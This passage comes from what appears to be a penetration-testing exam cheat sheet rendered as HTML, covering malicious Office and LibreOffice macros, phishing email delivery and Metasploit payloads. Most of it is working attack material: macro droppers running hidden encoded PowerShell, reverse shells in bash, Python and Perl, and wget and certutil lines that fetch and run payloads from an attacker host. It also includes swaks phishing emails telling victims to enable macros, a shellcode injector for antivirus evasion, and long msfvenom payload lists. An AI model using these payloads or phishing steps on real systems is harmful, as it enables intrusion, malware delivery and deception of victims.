    cmdStr = cmdStr &amp; &quot; -nop -w hidden -enc &quot; &amp; &quot;[Base64 Encoded Command]&quot;
    CreateObject(&quot;Wscript.Shell&quot;).Run cmdStr
End Sub
</code></pre>
              <p><strong>Executing Encoded Commands Without Direct PowerShell Reference</strong></p>
              <pre><code class="language-vba">Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = &quot;cmd.exe /c &quot;&quot;powershell.exe -nop -w hidden -enc &quot; &amp; &quot;[Base64 Encoded Command]&quot; &amp; &quot;&quot;&quot;&quot;
    CreateObject(&quot;Wscript.Shell&quot;).Run cmdStr
End Sub
</code></pre>
              <p><strong>Evading Antivirus Detection</strong></p>
              <pre><code class="language-powershell"># Using Encodings
$text = &quot;[Your PowerShell Command]&quot;
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
Write-Output $encoded

# Altering PowerShell Execution Policies
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand [Your Base64 Encoded Command]
</code></pre>
              <p><strong>Embedding JavaScript Payloads in HTML Documents</strong></p>
              <pre><code class="language-html">&lt;script&gt;
    var cmd = &quot;[Your JavaScript Command]&quot;;
    eval(cmd);
&lt;/script&gt;
</code></pre>
              <p><strong>Using Obfuscated JavaScript</strong></p>
              <pre><code class="language-javascript">var cmd = &quot;&quot;;
cmd += &quot;var shell = new ActiveXObject(&#39;WScript.Shell&#39;);&quot;;
cmd += &quot;shell.Run(&#39;cmd.exe /c powershell.exe -nop -w hidden -enc [Base64 Encoded Command]&#39;);&quot;;
eval(cmd);
</code></pre>
              <p><strong>Mounting WebDav Share as Network Drive (Windows)</strong></p>
              <pre><code class="language-powershell">net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
</code></pre>
              <h3 id="44-send-emails">4.4 Send Emails</h3>
              <h4 id="441-normal-email">4.4.1 Normal Email</h4>
              <p>This command sends a regular email with an attachment and a subject.</p>
              <pre><code class="language-bash">sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header &quot;Subject: [email-subject]&quot; --suppress-data
</code></pre>
              <ul>
                <li>
                  <p><strong>Purpose</strong>: this is a basic email with an attachment sent through an SMTP server.</p>
                </li>
                <li>
                  <p><strong>Key parameters</strong>:</p>
                  <ul>
                    <li><code>-t</code>: Recipient&#39;s email.</li>
                    <li><code>--from</code>: Sender&#39;s email.</li>
                    <li><code>--attach</code>: File to attach (e.g., a PDF or spreadsheet).</li>
                    <li><code>--server</code>: SMTP server to send the email.</li>
                    <li><code>--body</code>: Text file containing the email body.</li>
                    <li><code>--header</code>: Adds custom headers like &quot;Subject&quot;.</li>
                    <li><code>--suppress-data</code>: Hides the email body in the output (for cleaner logs).</li>
                  </ul>
                </li>
              </ul>
              <h4 id="442-email-with-authentication">4.4.2 Email with Authentication</h4>
              <p>This is useful when sending emails through an SMTP server that requires <strong>user
                  authentication</strong> (like many corporate or public SMTP servers).</p>
              <pre><code class="language-bash">sudo swaks -t &lt;recipient@example.com&gt; --from &lt;sender@example.com&gt; \
--attach config.Library-ms --server &lt;SMTP_SERVER&gt; --body body.txt \
--header &quot;Subject: Problems&quot; --suppress-data \
--auth LOGIN --auth-user &lt;username&gt; --auth-password &lt;password&gt;
</code></pre>
              <ul>
                <li>
                  <p><strong>Purpose</strong>: sends an email <strong>with SMTP authentication</strong> using a username
                    and password.</p>
                </li>
                <li>
                  <p><strong>Additional Parameters</strong>:</p>
                  <ul>
                    <li><code>--auth LOGIN</code>: Specifies authentication type.</li>
                    <li><code>--auth-user</code>: Username for the SMTP server.</li>
                    <li><code>--auth-password</code>: Password for the SMTP server.</li>
                  </ul>
                </li>
              </ul>
              <h4 id="443-email-with-custom-headers-for-social-engineering">4.4.3 Email with Custom Headers for Social
                Engineering</h4>
              <p>This email is designed to <strong>manipulate the recipient</strong> into thinking the message is
                urgent, increasing the chance they will open it. Common in <strong>phishing attacks</strong>.</p>
              <pre><code class="language-bash">sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header &quot;X-Priority: 1 (Highest)&quot; --header &quot;Importance: High&quot; --suppress-data
</code></pre>
              <ul>
                <li>
                  <p><strong>Purpose</strong>: sends an email with <strong>custom headers</strong> for <strong>social
                      engineering purposes</strong>.</p>
                </li>
                <li>
                  <p><strong>Additional Parameters</strong>:</p>
                  <ul>
                    <li><code>X-Priority</code>: Marks the email as high priority (1 being the highest).</li>
                    <li><code>Importance</code>: Marks the email as important.</li>
                  </ul>
                </li>
              </ul>
              <h4 id="444-alternative-tool-sendemail">4.4.4 Alternative Tool <code>sendemail</code></h4>
              <p>This command sends an email with an attachment, similar to the SWAKS command. It&rsquo;s often used
                for <strong>simple email automation</strong> or <strong>local mail servers</strong>.</p>
              <pre><code class="language-bash">sendemail -f &#39;[sender]&#39; -t &#39;[recipient]&#39; -s &quot;[smtp_server]:[port]&quot; \
-u &#39;[subject]&#39; -m &#39;[message]&#39; -a &#39;[attachment]&#39;
</code></pre>
              <ul>
                <li>
                  <p><strong>Purpose</strong>: <code>sendemail</code> is another tool for sending emails from the
                    command line. It&rsquo;s simpler but doesn&rsquo;t offer as many features as SWAKS.</p>
                </li>
                <li>
                  <p><strong>Key Parameters</strong>:</p>
                  <ul>
                    <li><code>-f</code>: Sender&#39;s email address.</li>
                    <li><code>-t</code>: Recipient&#39;s email address.</li>
                    <li><code>-s</code>: SMTP server and port (<code>192.168.203.140:25</code>).</li>
                    <li><code>-u</code>: Subject of the email.</li>
                    <li><code>-m</code>: Message body of the email.</li>
                    <li><code>-a</code>: Attachment (exploit.ods in this case).</li>
                  </ul>
                </li>
              </ul>
              <h4 id="445-comparison-summary">4.4.5 Comparison Summary</h4>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th><strong>Feature</strong></th>
                    <th><strong>Normal SWAKS</strong></th>
                    <th><strong>SWAKS with Auth</strong></th>
                    <th><strong>SWAKS Social Engineering</strong></th>
                    <th><strong>sendemail</strong></th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>Authentication</td>
                    <td>No</td>
                    <td>Yes</td>
                    <td>No</td>
                    <td>No</td>
                  </tr>
                  <tr>
                    <td>Custom Headers</td>
                    <td>Subject only</td>
                    <td>Subject only</td>
                    <td>Multiple (e.g., Priority, Importance)</td>
                    <td>Subject only</td>
                  </tr>
                  <tr>
                    <td>SMTP Authentication</td>
                    <td>No</td>
                    <td>Yes</td>
                    <td>No</td>
                    <td>No</td>
                  </tr>
                  <tr>
                    <td>Social Engineering Usage</td>
                    <td>No</td>
                    <td>No</td>
                    <td>Yes (with custom headers)</td>
                    <td>No</td>
                  </tr>
                  <tr>
                    <td>Tool Complexity</td>
                    <td>Moderate</td>
                    <td>Moderate</td>
                    <td>Moderate</td>
                    <td>Simple</td>
                  </tr>
                </tbody>
              </table>
              <h3 id="45-exploiting-libreoffice-macros-for-payload-execution">4.5 Exploiting LibreOffice Macros for
                Payload Execution</h3>
              <h4 id="451-linux-targets">4.5.1 Linux Targets</h4>
              <ol>
                <li><strong>Generate a Linux-Compatible Reverse Shell</strong></li>
              </ol>
              <pre><code class="language-bash">echo &#39;bash -i &gt;&amp; /dev/tcp/&lt;your_ip&gt;/4444 0&gt;&amp;1&#39; &gt; shell.sh

# Alternatively, use msfvenom to create an ELF payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;your_ip&gt; LPORT=4444 -f elf -o shell.elf

# If the target machine allows Bash scripts to execute
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;your_ip&gt; LPORT=4444 -f bash -o payload.sh

# Useful if Python is available on the target
msfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;your_ip&gt; LPORT=4444 -f raw -o payload.py

# Alternative Python Reverse Shell Payload
echo &#39;import socket,subprocess,os;s=socket.socket();s.connect((&quot;&lt;your_ip&gt;&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39; &gt; shell.py

# Alternative Perl Reverse Shell Payload
echo &#39;use Socket;$i=&quot;&lt;your_ip&gt;&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#39; &gt; shell.pl
</code></pre>
              <p><strong><code>-f elf</code></strong>: ELF format for Linux executables. The <strong>ELF (Executable and
                  Linkable Format)</strong> is the standard binary format for Linux executables. This ensures the
                payload is runnable on most Linux distributions.</p>
              <p><strong><code>-o shell.elf</code></strong>: Save the payload as <code>shell.elf</code>.</p>
              <ol start="2">
                <li><strong>Create a Malicious LibreOffice Macro</strong>: libreOffice supports <strong>Basic
                    macros</strong>, which can execute system commands. The example below downloads and executes the
                  payload on the target.<ol>
                    <li><strong>Open LibreOffice Writer</strong> and press <strong>ALT + F11</strong> to open the macro
                      editor.</li>
                    <li>Create a new macro under <strong>My Macros &gt; Standard &gt; Module1</strong>.</li>
                  </ol>
                </li>
              </ol>
              <p> </p>
              <pre><code class="language-basic">Sub RunShell
    Shell(&quot;/bin/bash -c &#39;wget http://&lt;your_ip&gt;/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh&#39;&quot;)
End Sub

- Shell: Executes the Bash command.  
- wget: Downloads the payload from your web server.  
- chmod +x: Makes the script executable.  
- /tmp/shell.sh: Runs the script from /tmp.
</code></pre>
              <ol start="3">
                <li><strong>Host the Payload on a Web Server</strong>: use <strong>Python&rsquo;s HTTP server</strong>
                  to
                  serve the payload.</li>
              </ol>
              <pre><code class="language-bash">python3 -m http.server 80
</code></pre>
              <ol start="4">
                <li>
                  <p><strong>Save the LibreOffice Document with Macro</strong>: save the document as
                    <strong><code>update.odt</code></strong> with the embedded macro. LibreOffice macros are not
                    executed automatically‚Äîsocial engineering is needed to trick the target into <strong>enabling
                      macros</strong>.
                  </p>
                </li>
                <li>
                  <p><strong>Setup a Netcat Listener</strong>:</p>
                </li>
              </ol>
              <pre><code class="language-bash">nc -lvnp 4444
</code></pre>
              <ol start="6">
                <li><strong>Deliver the Malicious Document via Email</strong>: use <strong><code>swaks</code></strong>
                  (or other tool from the Section 4.4.) to send the email with the malicious document attached:</li>
              </ol>
              <pre><code class="language-bash">swaks --to target@example.com --from emmanuel@example.com \
--server smtp.example.com:587 --auth LOGIN \
--auth-user emmanuel@example.com --auth-password &#39;your_password&#39; \
--attach update.odt --header &quot;Subject: Important Update&quot; \
--body &quot;Hello,\n\nPlease find the attached document and enable macros to view the content.\n\nBest regards,\nEmmanuel&quot;

# Execution Flow:
# 1. Target opens the LibreOffice document.
# 2. When the target enables macros, the payload is downloaded and executed.
# 3. A reverse shell connects to your Netcat listener.
</code></pre>
              <h4 id="452-windows-targets">4.5.2 Windows Targets</h4>
              <ol>
                <li><strong>Generate the Reverse Shell Payload with MSFvenom</strong>:</li>
              </ol>
              <pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=&lt;port&gt; -f hta-psh -o evil.hta
</code></pre>
              <p><strong><code>-f hta-psh</code></strong>: format the output as a PowerShell payload embedded in an HTA
                file. This format creates an <strong>HTA (HTML Application)</strong> file containing a PowerShell
                script. HTA files are often misused in attacks because they can execute scripts directly when opened on
                the victim&rsquo;s machine. PowerShell is ideal for this type of payload because it&rsquo;s a built-in
                scripting
                engine in Windows, making it less likely to be blocked.</p>
              <p><strong><code>-o evil.hta</code></strong>: save the payload as <code>evil.hta</code>. This option saves
                the generated payload as <code>evil.hta</code>. You can change the name, but it is critical that the
                file ends with the <code>.hta</code> extension, which ensures it behaves as an HTA application when
                opened.</p>
              <p><strong>Other Formats for Payloads with <code>msfvenom</code>:</strong> these formats allow versatility
                depending on the delivery method and endpoint constraints. For example, a PowerShell payload
                (<code>ps1</code>) could be useful if you are embedding the script in a macro-enabled Word document.</p>
              <ul>
                <li><strong><code>exe</code></strong>: Generate an executable (<code>-f exe -o evil.exe</code>)</li>
                <li><strong><code>vbs</code></strong>: Use a Visual Basic script (<code>-f vbs -o evil.vbs</code>)</li>
                <li><strong><code>ps1</code></strong>: Generate a pure PowerShell script
                  (<code>-f ps1 -o script.ps1</code>)</li>
                <li><strong><code>dll</code></strong>: Create a malicious DLL (<code>-f dll -o payload.dll</code>)</li>
              </ul>
              <ol start="2">
                <li><strong>Extract and Encode the Payload</strong>: open the generated HTA file (<code>evil.hta</code>)
                  and <strong>copy the payload</strong> (it is the Base64 encoded string). Use the following Python
                  script to divide the payload into 50-character chunks (easier to embed within a macro).</li>
              </ol>
              <pre><code class="language-python"># Python script to split the payload into 50-character chunks
s = &quot;&lt;PASTE_PAYLOAD_HERE&gt;&quot;  # Replace with your payload string
n = 50  # Chunk size

for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print(&#39;Str = Str + &quot;&#39; + chunk + &#39;&quot;&#39;)
</code></pre>
              <ol start="3">
                <li>
                  <p><strong>Create the LibreOffice Spreadsheet with Macro Code</strong>:</p>
                  <ol>
                    <li>Open <strong>LibreOffice Calc</strong> and create a new spreadsheet (save it as
                      <code>exploit.ods</code>).
                    </li>
                    <li><strong>Enable Macros</strong>: <ul>
                        <li>Go to <code>Tools</code> ‚Üí <code>Options</code> ‚Üí <code>LibreOffice</code> ‚Üí
                          <code>Security</code> ‚Üí <code>Macro Security</code>.
                        </li>
                        <li>Set security to <strong>Medium</strong> or <strong>Low</strong> to allow macros to run.</li>
                      </ul>
                    </li>
                    <li><strong>Insert the Macro Code</strong>:<ul>
                        <li>Go to <code>Tools</code> ‚Üí <code>Macros</code> ‚Üí <code>Organize Macros</code> ‚Üí
                          <code>LibreOffice Basic</code>.
                        </li>
                        <li>Click <strong>New</strong>, give it a name (e.g., <code>Exploit</code>), and <strong>paste
                            the macro code</strong> below.</li>
                      </ul>
                    </li>
                  </ol>
                </li>
                <li>
                  <p><strong>Macro Code Example</strong>: this macro concatenates the encoded payload chunks into a
                    string and executes it using PowerShell.</p>
                </li>
              </ol>
              <pre><code class="language-basic">REM ***** BASIC *****
Sub Exploit
    Dim Str As String
    &#39; Add payload chunks here
    Str = Str + &quot;powershell.exe -nop -w hidden -e &quot;
    Str = Str + &quot;&lt;INSERT_YOUR_PAYLOAD_CHUNKS&gt;&quot;
    
    &#39; Execute the payload using Shell
    Shell Str, 1
End Sub
</code></pre>
              <p><strong>Replace <code>&lt;INSERT_YOUR_PAYLOAD_CHUNKS&gt;</code></strong> with the output from the
                Python script.</p>
              <p><strong>Explanation</strong>: The macro creates a PowerShell command to run the payload
                (<code>-nop</code> for non-interactive, <code>-w hidden</code> for stealth) and executes it using the
                <code>Shell</code> function.
              </p>
              <p><strong>Shell Command</strong>: choosing
                between <code>Shell Str, 1</code> and <code>Shell(Str)</code> often depends on the specific requirements
                of the script and how the executed command should behave. In the case of exploiting LibreOffice macros,
                using <code>Shell Str, 1</code> provides greater control and is a more reliable approach for executing
                payloads in a way that is likely to succeed in various environments. The <code>Shell</code> function can
                also be used with just one argument, but this would imply that it runs the command without any specific
                window display options; this means it might not control how the command window behaves (e.g., hidden or
                minimized), which might not be desirable for a payload execution context.</p>
              <ol start="5">
                <li><strong>Configure the Listener on the Attacker Machine</strong>:</li>
              </ol>
              <pre><code class="language-bash">nc -lvnp 444
</code></pre>
              <ol start="6">
                <li><strong>Deliver the Spreadsheet to the Target</strong>: assuming you have a valid SMTP server
                  available for testing or phishing.</li>
              </ol>
              <pre><code class="language-bash">swaks --to target@example.com --from emmanuel@example.com \
--server smtp.example.com:587 --auth LOGIN \
--auth-user emmanuel@example.com --auth-password &#39;your_password&#39; \
--attach evil.hta --header &quot;Subject: Important Document&quot; \
--body &quot;Hi,\n\nPlease find the attached document.\n\nBest regards,\nEmmanuel&quot;
</code></pre>
              <p>Send the <code>exploit.ods</code> spreadsheet to the victim via email or other means. Instruct the
                victim to <strong>open the spreadsheet</strong> and <strong>enable macros</strong> when prompted.</p>
              <ol start="7">
                <li><strong>Post-Exploitation Considerations</strong></li>
              </ol>
              <ul>
                <li><strong>Upgrade to a Stable Shell</strong>:
                  <pre><code class="language-bash">python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre>
                </li>
                <li><strong>Gather System Info</strong>:
                  <pre><code class="language-bash">systeminfo
whoami
ipconfig /all
</code></pre>
                </li>
                <li><strong>Persistence and Data Exfiltration</strong>: consider planting additional backdoors or
                  gathering sensitive information. For example:
                  <code>cd C:\xampp\htdocs &amp;&amp; certutil -urlcache -split -f http://[attacker_ip]/rev.exe &amp;&amp; certutil -urlcache -split -f http://[attacker_ip]/shell.pHp</code>
                </li>
              </ul>

              <h2 id="5-antivirus-evasion--metasploit">5. <span class="emoji">üõ°Ô∏è</span> Antivirus Evasion &amp;
                Metasploit</h2>
              <h3 id="51-in-memory-injection-with-powershell-script">5.1 In-Memory Injection with PowerShell Script</h3>
              <h4 id="511-payload">5.1.1 Payload</h4>
              <pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v sc
</code></pre>
              <h4 id="512-script">5.1.2 Script</h4>
              <pre><code class="language-powershell"># Import necessary functions from kernel32.dll and msvcrt.dll
$importCode = &#39;
[DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

[DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);

[DllImport(&quot;msvcrt.dll&quot;, SetLastError=false)]
public static extern IntPtr memset(IntPtr dest, int c, UInt32 count);
&#39;;

# Add the imported functions to the PowerShell session
$win32Functions = Add-Type -MemberDefinition $importCode -Name &quot;Win32API&quot; -Namespace &quot;Win32&quot; -PassThru;

# Define the shellcode (replace with actual shellcode)
[Byte[]] $shellcode = [PLACE YOUR SHELLCODE HERE];

# Allocate memory for the shellcode
$memSize = 0x1000;
if ($shellcode.Length -gt $memSize) { $memSize = $shellcode.Length };
$allocatedMemory = $win32Functions::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40);

# Copy the shellcode into the allocated memory
for ($i = 0; $i -lt $shellcode.Length; $i++) {
    $win32Functions::memset($allocatedMemory + $i, $shellcode[$i], 1);
}

# Execute the shellcode in a new thread
$win32Functions::CreateThread([IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero);

# Keep the script running
# This part of the script ensures that the PowerShell process doesn&#39;t terminate immediately after the shellcode is executed.
# If the script exits too soon, the thread created to execute the shellcode might be terminated, stopping the shellcode.
# By keeping the script alive with an infinite loop and a sleep command, the shellcode has sufficient time to run.
while ($true) {
    Start-Sleep 60;
}
</code></pre>
              <p><strong>Alternative script</strong> from this <a
                  href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">GitHub</a>, in
                case we want to use something different.</p>
              <pre><code class="language-python">#!/usr/bin/env python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__version__ = &#39;0.1&#39;
__author__ = &#39;Carlos Perez, Carlos_Perez@darkoperator.com&#39;
__doc__ = &quot;&quot;&quot;
PSEncoder http://www.darkoperator.com by Carlos Perez, Darkoperator

Encodes a given Windows PowerShell script in to a Base64 String that can be
passed to the powershell.exe program as an option.
&quot;&quot;&quot;
import base64
import sys
import re
import os
import getopt

def powershell_encode(data):
    # blank command will store our fixed unicode variable
    blank_command = &quot;&quot;
    powershell_command = &quot;&quot;
    # Remove weird chars that could have been added by ISE
    n = re.compile(u&#39;(\xef|\xbb|\xbf)&#39;)
    # loop through each character and insert null byte
    for char in (n.sub(&quot;&quot;, data)):
        # insert the nullbyte
        blank_command += char + &quot;\x00&quot;
    # assign powershell command as the new one
    powershell_command = blank_command
    # base64 encode the powershell command
    powershell_command = base64.b64encode(powershell_command.encode())
    return powershell_command.decode(&quot;utf-8&quot;)

def usage():
    print(&quot;Version: {0}&quot;.format(__version__))
    print(&quot;Usage: {0} &lt;options&gt;\n&quot;.format(sys.argv[0]))
    print(&quot;Options:&quot;)
    print(&quot;   -h, --help                  Show this help message and exit&quot;)
    print(&quot;   -s, --script      &lt;script&gt;  PowerShell Script.&quot;)
    sys.exit(0)

def main():
    try:
        options, args = getopt.getopt(sys.argv[1:], &#39;hs:&#39;, [&#39;help&#39;, &#39;script=&#39;])
    except getopt.GetoptError:
        print(&quot;Wrong Option Provided!&quot;)
        usage()
    if len(sys.argv) == 1:
        usage()

    for opt, arg in options:
        if opt in (&#39;-h&#39;, &#39;--help&#39;):
            usage()
        elif opt in (&#39;-s&#39;, &#39;--script&#39;):
            script_file = arg
            if not os.path.isfile(script_file):
                print(&quot;The specified powershell script does not exists&quot;)
                sys.exit(1)
            else:
                ps_script = open(script_file, &#39;r&#39;).read()
                print(powershell_encode(ps_script))

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
              <h3 id="52-shellter-automatic-tool">5.2 Shellter (Automatic Tool)</h3>
              <ul>
                <li><strong>Installation</strong>:
                  <code>apt-cache search shellter &amp;&amp; sudo apt install shellter</code>
                </li>
                <li><strong>Installation of wine (required to run shellter)</strong>: <code>sudo apt install wine</code>
                  and execute this one with sudo su:
                  <code>dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code>
                </li>
                <li><strong>One-liner to set a Meterpreter listener</strong>:
                  <code>msfconsole -x &quot;use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [IP];set LPORT [PORT];run;&quot;</code>
                </li>
                <li>Help for troubleshooting: <a
                    href="https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811">https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811</a>
                </li>
                <li>Another similar tools are <a href="https://github.com/Veil-Framework/Veil">Veil</a> and <a
                    href="https://cyberarms.wordpress.com/2018/05/29/anti-virus-bypass-with-veil-on-kali-linux/">Guide</a>.
                </li>
              </ul>
              <h3 id="53-metasploit">5.3 Metasploit</h3>
              <p><strong>Metasploit Usage</strong></p>
              <ol>
                <li>Starting the <i>Metasploit</i> <strong>database</strong></li>
              </ol>
              <pre><code class="language-bash">sudo msfdb init
sudo systemctl enable postgresql
sudo msfconsole
</code></pre>
              <ol start="2">
                <li>Create workspaces: <code>workspace -a [nameToGive]</code></li>
                <li>Search for a specific type of module: <code>search type:auxiliary smb</code></li>
                <li>Set payload information using the database, in this case the hosts:
                  <code>services -p 445 --rhosts</code>
                </li>
                <li>Set a <strong>listener</strong></li>
              </ol>
              <p><strong>Msfvenom Usage</strong></p>
              <pre><code class="language-bash"># Show available payloads
msfvenom -l payloads

# List payload options
msfvenom -p [PAYLOAD] --list-options

# Payload encoding
msfvenom -p [PAYLOAD] -e [ENCODER] -f [FORMAT] -i [ENCODE] [COUNT_OF_ENCODING] LHOST=[IP] LPORT=[PORT]
</code></pre>
              <h3 id="54-msfvenom">5.4 Msfvenom</h3>
              <h4 id="541-listeners">5.4.1 Listeners</h4>
              <pre><code class="language-bash"># Using Netcat, for NON-Stage payloads ONLY.
nc -nvlp &lt;LISTENING_PORT&gt;

# Using Metasploit (usage forbidden in the exam)
msf&gt;use exploit/multi/handler  
msf&gt;set payload windows/meterpreter/reverse_tcp  
msf&gt;set lhost &lt;IP&gt;  
msf&gt;set lport &lt;PORT&gt;  
msf&gt; set ExitOnSession false  
msf&gt;exploit -j

# To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit; the -j option is to keep all the connected session in the background.
</code></pre>
              <h4 id="542-main-payloads">5.4.2 Main Payloads</h4>
              <pre><code class="language-bash"># Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe

# Apache Tomcat (JSP)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp

# Apache Tomcat (WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp

# ASPX
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;443&gt; -o shell64.aspx

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.sh

# JavaScript Shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f js_le -o shellcode

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.pl

# PHP:  we need to add the &lt;?php at the first line of the file so that it will execute as a PHP webpage
msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php

cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php

# Python
msfvenom -p cmd/unix/reverse_python LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.py

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war
</code></pre>
              <h4 id="543-additional-payloads">5.4.3 Additional Payloads</h4>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>MSFVenom Payload Generation One-Liner</th>
                    <th>Description</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>
                      <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &gt; shell.elf</code>
                    </td>
                    <td>Linux Meterpreter reverse shell x86 multi stage</td>
                  </tr>
                  <tr>
                    <td>
                      <code>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf &gt; shell.elf</code>
                    </td>
                    <td>Linux Meterpreter bind shell x86 multi stage</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf &gt; shell.elf</code></td>
                    <td>Linux bind shell x64 single stage</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf &gt; shell.elf</code>
                    </td>
                    <td>Linux reverse shell x64 single stage</td>
                  </tr>
                  <tr>
                    <td>
                      <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt; shell.exe</code>
                    </td>
                    <td>Windows Meterpreter reverse shell</td>
                  </tr>
                  <tr>
                    <td>
                      <code>msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&quot; -f exe &gt; shell.exe</code>
                    </td>
                    <td>Windows Meterpreter http reverse shell</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe &gt; shell.exe</code>
                    </td>
                    <td>Windows Meterpreter bind shell</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt; shell.exe</code>
                    </td>
                    <td>Windows CMD Multi Stage</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe &gt; shell.exe</code>
                    </td>
                    <td>Windows CMD Single Stage</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p windows/adduser USER=hacker PASS=password -f exe &gt; useradd.exe</code></td>
                    <td>Windows add user</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho &gt; shell.macho</code>
                    </td>
                    <td>Mac Reverse Shell</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho &gt; shell.macho</code>
                    </td>
                    <td>Mac Bind shell</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw &gt; shell.py</code></td>
                    <td>Python Shell</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw &gt; shell.sh</code></td>
                    <td>BASH Shell</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw &gt; shell.pl</code></td>
                    <td>PERL Shell</td>
